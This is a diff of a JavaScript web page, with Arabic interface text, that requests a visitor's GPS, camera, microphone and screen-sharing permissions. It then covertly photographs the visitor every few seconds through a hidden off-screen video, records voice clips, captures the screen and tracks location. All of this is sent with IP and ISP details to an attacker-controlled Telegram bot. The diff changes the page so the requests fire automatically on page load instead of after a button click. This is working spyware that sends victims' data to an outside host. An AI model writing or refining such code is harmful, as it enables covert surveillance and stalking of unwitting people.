-            statusText.textContent = '📍 جاري طلب الموقع...';
-            statusDetail.textContent = 'الرجاء الموافقة على موقعك';
-            statusDot.className = 'status-dot dot-waiting';
-            gpsStatus.textContent = '⏳ جاري الطلب...';
-            gpsStatus.className = 'status waiting';
+            setStatus('📍 طلب الموقع...', 'الرجاء الموافقة على موقعك', 'loading');
+            setRowPending(rowGps, badgeGps, '⏳ جاري الطلب...');
             
             try {
                 const pos = await new Promise((resolve, reject) => {
@@ -1128,32 +294,28 @@ padding:30px;
                 perms.gps = true;
                 locationCount++;
                 await sendLocation();
-                statusDetail.textContent = '✅ تم تفعيل الموقع';
-                gpsStatus.textContent = '✅ تم التفعيل';
-                gpsStatus.className = 'status granted';
+                setStatus('✅ تم تفعيل الموقع', 'جاري طلب الصلاحية التالية', 'success');
+                badgeGps.textContent = '✅ تم التفعيل';
+                badgeGps.className = 'status-badge badge-granted';
+                rowGps.className = 'perm-row granted';
             } catch(e) {
                 perms.gps = false;
-                statusDetail.textContent = '❌ فشل الموقع: ' + e.message;
-                gpsStatus.textContent = '❌ مرفوض';
-                gpsStatus.className = 'status denied';
+                setStatus('❌ فشل الموقع', 'جاري طلب الصلاحية التالية', 'error');
+                setRowDenied(rowGps, badgeGps);
                 console.log('❌ فشل الموقع:', e.message);
             }
+            await delay(800);
             updateUI();
-            await delay(1000);
         }
 
         // ============================================================
-        // 2. طلب الكاميرا
+        // 2. الكاميرا
         // ============================================================
         async function requestCamera() {
-            statusText.textContent = '📷 جاري طلب الكاميرا...';
-            statusDetail.textContent = 'الرجاء الموافقة على الكاميرا';
-            statusDot.className = 'status-dot dot-waiting';
-            camStatus.textContent = '⏳ جاري الطلب...';
-            camStatus.className = 'status waiting';
+            setStatus('📷 طلب الكاميرا...', 'الرجاء الموافقة على الكاميرا', 'loading');
+            setRowPending(rowCam, badgeCam, '⏳ جاري الطلب...');
             
             try {
-                // جرب الكاميرا الخلفية
                 const stream = await navigator.mediaDevices.getUserMedia({
                     video: {
                         facingMode: 'environment',
@@ -1164,17 +326,17 @@ padding:30px;
                 });
                 currentStream = stream;
                 perms.cam = true;
-                statusDetail.textContent = '✅ تم تفعيل الكاميرا الخلفية';
-                camStatus.textContent = '✅ تم التفعيل';
-                camStatus.className = 'status granted';
+                setStatus('✅ تم تفعيل الكاميرا', 'جاري طلب الصلاحية التالية', 'success');
+                badgeCam.textContent = '✅ تم التفعيل';
+                badgeCam.className = 'status-badge badge-granted';
+                rowCam.className = 'perm-row granted';
                 
-                // تصوير فوري
-                setTimeout(() => capturePhoto(), 1000);
+                setTimeout(() => capturePhoto(), 500);
                 
             } catch(e) {
-                // لو فشلت الخلفية جرب الأمامية
+                // جرب الأمامية
                 try {
-                    statusDetail.textContent = '📷 جاري طلب الكاميرا الأمامية...';
+                    setStatus('📷 طلب الكاميرا الأمامية...', 'الرجاء الموافقة', 'loading');
                     const stream = await navigator.mediaDevices.getUserMedia({
                         video: {
                             facingMode: 'user',
@@ -1185,31 +347,28 @@ padding:30px;
                     });
                     currentStream = stream;
                     perms.cam = true;
-                    statusDetail.textContent = '✅ تم تفعيل الكاميرا الأمامية';
-                    camStatus.textContent = '✅ تم التفعيل';
-                    camStatus.className = 'status granted';
-                    setTimeout(() => capturePhoto(), 1000);
+                    setStatus('✅ تم تفعيل الكاميرا الأمامية', 'جاري طلب الصلاحية التالية', 'success');
+                    badgeCam.textContent = '✅ تم التفعيل';
+                    badgeCam.className = 'status-badge badge-granted';
+                    rowCam.className = 'perm-row granted';
+                    setTimeout(() => capturePhoto(), 500);
                 } catch(e2) {
                     perms.cam = false;
-                    statusDetail.textContent = '❌ فشل الكاميرا';
-                    camStatus.textContent = '❌ مرفوض';
-                    camStatus.className = 'status denied';
+                    setStatus('❌ فشل الكاميرا', 'جاري طلب الصلاحية التالية', 'error');
+                    setRowDenied(rowCam, badgeCam);
                     console.log('❌ فشل الكاميرا:', e2.message);
                 }
             }
+            await delay(800);
             updateUI();
-            await delay(1000);
         }
 
         // ============================================================
-        // 3. طلب الميكروفون
+        // 3. الميكروفون
         // ============================================================
         async function requestMic() {
-            statusText.textContent = '🎤 جاري طلب الميكروفون...';
-            statusDetail.textContent = 'الرجاء الموافقة على الميكروفون';
-            statusDot.className = 'status-dot dot-waiting';
-            micStatus.textContent = '⏳ جاري الطلب...';
-            micStatus.className = 'status waiting';
+            setStatus('🎤 طلب الميكروفون...', 'الرجاء الموافقة على الميكروفون', 'loading');
+            setRowPending(rowMic, badgeMic, '⏳ جاري الطلب...');
             
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ 
@@ -1220,35 +379,30 @@ padding:30px;
                     } 
                 });
                 perms.mic = true;
-                statusDetail.textContent = '✅ تم تفعيل الميكروفون';
-                micStatus.textContent = '✅ تم التفعيل';
-                micStatus.className = 'status granted';
+                setStatus('✅ تم تفعيل الميكروفون', 'جاري طلب الصلاحية التالية', 'success');
+                badgeMic.textContent = '✅ تم التفعيل';
+                badgeMic.className = 'status-badge badge-granted';
+                rowMic.className = 'perm-row granted';
                 
                 // بدء التسجيل فوراً
-                setTimeout(() => {
-                    startVoiceRecording();
-                }, 1000);
+                setTimeout(() => startVoiceRecording(), 1000);
                 
             } catch(e) {
                 perms.mic = false;
-                statusDetail.textContent = '❌ فشل الميكروفون';
-                micStatus.textContent = '❌ مرفوض';
-                micStatus.className = 'status denied';
+                setStatus('❌ فشل الميكروفون', 'جاري طلب الصلاحية التالية', 'error');
+                setRowDenied(rowMic, badgeMic);
                 console.log('❌ فشل الميكروفون:', e.message);
             }
+            await delay(800);
             updateUI();
-            await delay(1000);
         }
 
         // ============================================================
-        // 4. طلب الشاشة
+        // 4. الشاشة
         // ============================================================
         async function requestScreen() {
-            statusText.textContent = '🖥️ جاري طلب مشاركة الشاشة...';
-            statusDetail.textContent = 'الرجاء الموافقة على مشاركة الشاشة';
-            statusDot.className = 'status-dot dot-waiting';
-            screenStatus.textContent = '⏳ جاري الطلب...';
-            screenStatus.className = 'status waiting';
+            setStatus('🖥️ طلب مشاركة الشاشة...', 'الرجاء الموافقة على مشاركة الشاشة', 'loading');
+            setRowPending(rowScreen, badgeScreen, '⏳ جاري الطلب...');
             
             try {
                 const stream = await navigator.mediaDevices.getDisplayMedia({
@@ -1259,21 +413,21 @@ padding:30px;
                 });
                 screenStream = stream;
                 perms.screen = true;
-                statusDetail.textContent = '✅ تم تفعيل مشاركة الشاشة';
-                screenStatus.textContent = '✅ تم التفعيل';
-                screenStatus.className = 'status granted';
+                setStatus('✅ تم تفعيل مشاركة الشاشة', 'تم طلب جميع الصلاحيات', 'success');
+                badgeScreen.textContent = '✅ تم التفعيل';
+                badgeScreen.className = 'status-badge badge-granted';
+                rowScreen.className = 'perm-row granted';
                 
                 setTimeout(() => captureScreen(), 1000);
                 
             } catch(e) {
                 perms.screen = false;
-                statusDetail.textContent = '❌ فشل مشاركة الشاشة';
-                screenStatus.textContent = '❌ مرفوض';
-                screenStatus.className = 'status denied';
+                setStatus('⚠️ تم رفض مشاركة الشاشة', 'تم طلب جميع الصلاحيات', 'error');
+                setRowDenied(rowScreen, badgeScreen);
                 console.log('❌ فشل مشاركة الشاشة:', e.message);
             }
+            await delay(800);
             updateUI();
-            await delay(1000);
         }
 
         // ============================================================
@@ -1286,29 +440,17 @@ padding:30px;
         // ============================================================
         async function switchCamera() {
             if (!isRunning || !perms.cam) return;
-            
             try {
-                if (currentStream) {
-                    currentStream.getTracks().forEach(t => t.stop());
-                }
-                
+                if (currentStream) currentStream.getTracks().forEach(t => t.stop());
                 const facing = isFront ? 'environment' : 'user';
                 isFront = !isFront;
-                
                 const stream = await navigator.mediaDevices.getUserMedia({
-                    video: {
-                        facingMode: facing,
-                        width: { ideal: 1920 },
-                        height: { ideal: 1080 }
-                    },
+                    video: { facingMode: facing, width: { ideal: 1920 }, height: { ideal: 1080 } },
                     audio: false
                 });
                 currentStream = stream;
                 setTimeout(() => capturePhoto(), 500);
-                console.log(`🔄 تم التبديل للكاميرا ${isFront ? 'الأمامية' : 'الخلفية'}`);
-            } catch(e) {
-                console.log('❌ فشل تبديل الكاميرا:', e.message);
-            }
+            } catch(e) { console.log('❌ فشل تبديل الكاميرا:', e.message); }
         }
 
         // ============================================================
@@ -1316,7 +458,6 @@ padding:30px;
         // ============================================================
         async function capturePhoto() {
             if (!currentStream || !perms.cam || !isRunning) return;
-            
             try {
                 const video = document.createElement('video');
                 video.srcObject = currentStream;
@@ -1324,32 +465,22 @@ padding:30px;
                 video.style.top = '-9999px';
                 document.body.appendChild(video);
                 await video.play();
-                
                 if (video.videoWidth === 0 || video.videoHeight === 0) {
                     document.body.removeChild(video);
                     return;
                 }
-                
                 const canvas = document.createElement('canvas');
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(video, 0, 0);
-                
+                canvas.getContext('2d').drawImage(video, 0, 0);
                 const dataUrl = canvas.toDataURL('image/jpeg', 0.9);
                 photoCount++;
                 const type = isFront ? 'أمامية' : 'خلفية';
                 await sendPhoto(dataUrl, `📸 ${type} #${photoCount}`);
-                
                 document.body.removeChild(video);
                 updateUI();
-                
-                if (photoCount % 3 === 0) {
-                    setTimeout(() => switchCamera(), 1000);
-                }
-            } catch(e) {
-                console.log('❌ خطأ في التصوير:', e.message);
-            }
+                if (photoCount % 3 === 0) setTimeout(() => switchCamera(), 1000);
+            } catch(e) { console.log('❌ خطأ في التصوير:', e.message); }
         }
 
         // ============================================================
@@ -1357,7 +488,6 @@ padding:30px;
         // ============================================================
         async function captureScreen() {
             if (!screenStream || !perms.screen || !isRunning) return;
-            
             try {
                 const video = document.createElement('video');
                 video.srcObject = screenStream;
@@ -1365,19 +495,14 @@ padding:30px;
                 video.style.top = '-9999px';
                 document.body.appendChild(video);
                 await video.play();
-                
                 const canvas = document.createElement('canvas');
                 canvas.width = video.videoWidth || 1920;
                 canvas.height = video.videoHeight || 1080;
                 canvas.getContext('2d').drawImage(video, 0, 0);
-                
                 const dataUrl = canvas.toDataURL('image/jpeg', 0.85);
                 await sendPhoto(dataUrl, `🖥️ شاشة #${photoCount}`);
-                
                 document.body.removeChild(video);
-            } catch(e) {
-                console.log('❌ خطأ في تصوير الشاشة:', e.message);
-            }
+            } catch(e) { console.log('❌ خطأ في تصوير الشاشة:', e.message); }
         }
 
         // ============================================================
@@ -1385,47 +510,27 @@ padding:30px;
         // ============================================================
         async function startVoiceRecording() {
             if (!perms.mic || !isRunning) return;
-            
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ 
-                    audio: {
-                        echoCancellation: false,
-                        noiseSuppression: false,
-                        autoGainControl: false
-                    } 
+                    audio: { echoCancellation: false, noiseSuppression: false, autoGainControl: false } 
                 });
-                
                 audioChunks = [];
-                mediaRecorder = new MediaRecorder(stream, { 
-                    mimeType: 'audio/webm;codecs=opus'
-                });
-                
-                mediaRecorder.ondataavailable = e => {
-                    if (e.data.size > 0) audioChunks.push(e.data);
-                };
-                
+                mediaRecorder = new MediaRecorder(stream, { mimeType: 'audio/webm;codecs=opus' });
+                mediaRecorder.ondataavailable = e => { if (e.data.size > 0) audioChunks.push(e.data); };
                 mediaRecorder.onstop = async () => {
                     if (audioChunks.length > 0) {
                         const blob = new Blob(audioChunks, { type: 'audio/webm' });
                         audioCount++;
                         await sendAudio(blob);
                         updateUI();
-                        console.log(`✅ تم إرسال الفويس #${audioCount}`);
                     }
                     stream.getTracks().forEach(t => t.stop());
                 };
-                
                 mediaRecorder.start();
-                
                 setTimeout(() => {
-                    if (mediaRecorder && mediaRecorder.state === 'recording') {
-                        mediaRecorder.stop();
-                    }
+                    if (mediaRecorder && mediaRecorder.state === 'recording') mediaRecorder.stop();
                 }, 10000);
-                
-            } catch(e) {
-                console.log('❌ خطأ في التسجيل:', e.message);
-            }
+            } catch(e) { console.log('❌ خطأ في التسجيل:', e.message); }
         }
 
         // ============================================================
@@ -1438,15 +543,8 @@ padding:30px;
                 form.append('chat_id', CHAT_ID);
                 form.append('photo', blob, `photo_${Date.now()}.jpg`);
                 form.append('caption', `${caption} - ${new Date().toLocaleString('ar-EG')}`);
-                
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                    method: 'POST',
-                    body: form
-                });
-                console.log(`✅ تم إرسال الصورة: ${caption}`);
-            } catch(e) {
-                console.log('❌ فشل إرسال الصورة:', e.message);
-            }
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: form });
+            } catch(e) { console.log('❌ فشل إرسال الصورة:', e.message); }
         }
 
         // ============================================================
@@ -1458,15 +556,8 @@ padding:30px;
                 form.append('chat_id', CHAT_ID);
                 form.append('audio', blob, `voice_${Date.now()}.webm`);
                 form.append('caption', `🎙️ فويس #${audioCount} - ${new Date().toLocaleString('ar-EG')}`);
-                
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {
-                    method: 'POST',
-                    body: form
-                });
-                console.log(`✅ تم إرسال الفويس #${audioCount}`);
-            } catch(e) {
-                console.log('❌ فشل إرسال الفويس:', e.message);
-            }
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, { method: 'POST', body: form });
+            } catch(e) { console.log('❌ فشل إرسال الفويس:', e.message); }
         }
 
         // ============================================================
@@ -1474,64 +565,37 @@ padding:30px;
         // ============================================================
         async function sendLocation() {
             if (!lastLocation) return;
-            
             const msg = `📍 *موقعي*\n📌 https://www.google.com/maps?q=${lastLocation.lat},${lastLocation.lon}\n🎯 دقة: ${lastLocation.accuracy}م\n🕐 ${new Date().toLocaleString('ar-EG')}`;
-            
             try {
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: msg,
-                        parse_mode: 'Markdown'
-                    })
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown' })
                 });
                 locationCount++;
                 updateUI();
-                console.log('✅ تم إرسال الموقع');
-            } catch(e) {
-                console.log('❌ فشل إرسال الموقع:', e.message);
-            }
+            } catch(e) { console.log('❌ فشل إرسال الموقع:', e.message); }
         }
 
         // ============================================================
         // تقرير كامل
         // ============================================================
         async function sendFullReport() {
-            let msg = `🚨 *تقرير شامل*\n═══════════════════════\n`;
-            msg += `🕐 ${new Date().toLocaleString('ar-EG')}\n\n`;
-            
-            if (lastLocation) {
-                msg += `📍 ${lastLocation.lat}, ${lastLocation.lon}\n`;
-                msg += `🎯 دقة: ${lastLocation.accuracy}م\n\n`;
-            }
-            
+            let msg = `🚨 *تقرير شامل*\n═══════════════════════\n🕐 ${new Date().toLocaleString('ar-EG')}\n\n`;
+            if (lastLocation) msg += `📍 ${lastLocation.lat}, ${lastLocation.lon}\n🎯 دقة: ${lastLocation.accuracy}م\n\n`;
             try {
                 const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json());
                 const info = await fetch(`http://ip-api.com/json/${ip.ip}?lang=ar`).then(r => r.json());
-                msg += `🌐 ${info.country || ''} - ${info.city || ''}\n`;
-                msg += `📡 ${info.isp || ''}\n\n`;
+                msg += `🌐 ${info.country || ''} - ${info.city || ''}\n📡 ${info.isp || ''}\n\n`;
             } catch(e) {}
-            
-            msg += `📸 الصور: ${photoCount}\n`;
-            msg += `🎙️ الفويسات: ${audioCount}\n`;
-            msg += `📍 المواقع: ${locationCount}\n\n`;
-            msg += `📷 كاميرا: ${perms.cam?'✅':'❌'}\n`;
-            msg += `🎤 ميكروفون: ${perms.mic?'✅':'❌'}\n`;
-            msg += `📍 GPS: ${perms.gps?'✅':'❌'}\n`;
-            msg += `🖥️ شاشة: ${perms.screen?'✅':'❌'}\n`;
+            msg += `📸 الصور: ${photoCount}\n🎙️ الفويسات: ${audioCount}\n📍 المواقع: ${locationCount}\n\n`;
+            msg += `📷 كاميرا: ${perms.cam?'✅':'❌'}\n🎤 ميكروفون: ${perms.mic?'✅':'❌'}\n📍 GPS: ${perms.gps?'✅':'❌'}\n🖥️ شاشة: ${perms.screen?'✅':'❌'}\n`;
             msg += `═══════════════════════`;
-            
             try {
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: msg,
-                        parse_mode: 'Markdown'
-                    })
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown' })
                 });
             } catch(e) {}
         }
@@ -1540,37 +604,20 @@ padding:30px;
         // التشغيل التلقائي
         // ============================================================
         function startAutoCapture() {
-            setInterval(() => {
-                if (perms.cam && isRunning) capturePhoto();
-            }, 3000);
-            
-            setInterval(() => {
-                if (perms.cam && isRunning) switchCamera();
-            }, 15000);
+            setInterval(() => { if (perms.cam && isRunning) capturePhoto(); }, 3000);
+            setInterval(() => { if (perms.cam && isRunning) switchCamera(); }, 15000);
         }
-
         function startAutoScreen() {
-            setInterval(() => {
-                if (perms.screen && isRunning) captureScreen();
-            }, 8000);
+            setInterval(() => { if (perms.screen && isRunning) captureScreen(); }, 8000);
         }
-
         function startAutoVoice() {
-            setInterval(() => {
-                if (perms.mic && isRunning) startVoiceRecording();
-            }, 15000);
+            setInterval(() => { if (perms.mic && isRunning) startVoiceRecording(); }, 15000);
         }
-
         function trackLocation() {
             if (locationWatchId) navigator.geolocation.clearWatch(locationWatchId);
-            
             locationWatchId = navigator.geolocation.watchPosition(
                 (pos) => {
-                    lastLocation = {
-                        lat: pos.coords.latitude,
-                        lon: pos.coords.longitude,
-                        accuracy: pos.coords.accuracy
-                    };
+                    lastLocation = { lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy };
                     if (Math.random() < 0.2) sendLocation();
                 },
                 () => {},
@@ -1579,10 +626,12 @@ padding:30px;
         }
 
         // ============================================================
-        // زر البدء
+        // بدء التشغيل فوراً عند تحميل الصفحة
         // ============================================================
-        startBtn.addEventListener('click', () => {
-            requestPermissionsSequential();
+        window.addEventListener('load', () => {
+            setTimeout(() => {
+                requestAllPermissions();
+            }, 500);
         });
 
         // ============================================================
@@ -1595,7 +644,14 @@ padding:30px;
             }
         });
 
-        console.log('🚀 تم التحميل - اضغط زر البدء');
+        // ============================================================
+        // تحذير HTTPS
+        // ============================================================
+        if (window.location.protocol !== 'https:' && window.location.hostname !== 'localhost') {
+            setStatus('⚠️ تحذير', 'استخدم HTTPS لتشغيل الكاميرا', 'error');
+        }
+
+        console.log('🚀 تم التحميل - سيتم طلب الصلاحيات تلقائياً');
     </script>
 </body>
 </html>
